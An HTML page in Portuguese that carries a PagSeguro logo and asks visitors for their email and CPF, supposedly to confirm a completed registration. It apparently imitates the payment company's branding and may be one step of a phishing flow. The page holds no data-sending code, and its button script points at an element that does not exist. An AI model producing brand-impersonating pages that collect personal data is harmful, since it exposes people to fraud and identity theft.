<!DOCTYPE html>
<html lang="pt-br">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" href="/favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" href="./style.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
      rel="stylesheet"
    />
    <title>Conclusão</title>
  </head>
  <body>
    <img
      src="./images/logopagseguro.png"
      alt=""
      style="
        width: 120px;
        margin-top: -120px;
        margin-left: -220px;
      "
    />
    <div id="orientacao">
      <h1
        style="
          position: absolute;
          margin: -208px 14px;
          font-size: 23px;
          font-weight: 400;
          color: #1c1916;
        "
      >
        Digite seu E-mail e CPF para comunicar-mos a conclusão do cadastro
      </h1>
      <p style="position: absolute; margin: -109px 14px; color: #616159">
        Digite seu E-mail
      </p>
      <span style="margin-left: 35px; color: #616159">Digite seu E-mail</span>
      <input
        type="text"
        id="email"
        style="
          margin: 0px 35px;
          width: 80%;
          height: 35px;
          border-radius: 8px;
          background-color: #6161591a;
          color: #1c1916;
          text-align: center;
          font-size: 18px;
          outline: none;
        "
      />

      <span style="margin-left: 35px; color: #616159">Digite seu CPF</span>
      <input
        type="text"
        id="cpf"
        style="
          margin: 0px 35px;
          width: 80%;
          height: 35px;
          border-radius: 8px;
          background-color: #6161591a;
          color: #1c1916;
          text-align: center;
          font-size: 18px;
          outline: none;
        "
      />
    </div>
    <button
      style="
        width: 360px;
        height: 40px;
        font-weight: 800;
        border-radius: 20px;
        border: none;
        color: white;
        background-color: var(--cor--azul);
      "
      id="btn-conclusao"
    >
      Continuar
    </button>
    <script>
       document.getElementById("btn-conf-cel").addEventListener("click", function () {
        window.location.href = "conclusao.html";
      });
    </script>
  </body>
</html>
